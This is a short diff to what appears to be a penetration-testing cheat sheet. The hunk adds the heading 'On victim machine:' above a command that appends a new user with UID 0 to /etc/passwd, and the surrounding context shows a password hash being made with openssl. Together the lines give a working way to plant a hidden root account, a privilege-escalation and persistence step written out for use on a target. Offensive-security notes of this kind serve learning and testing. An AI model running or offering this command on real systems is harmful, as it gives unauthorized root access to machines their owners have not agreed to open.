@@ -7,6 +7,7 @@ For backwards compatibility, if a password hash is present in the second column 
 openssl passwd $(NEW_PASSWORD)
 ```
 ## Add entry to /etc/passwd
+On victim machine:
 ```bash
 echo "$(NEW_USER):$(OPENSSL_OUTPUT):0:0:root:/root:/bin/bash" >> /etc/passwd
 ```
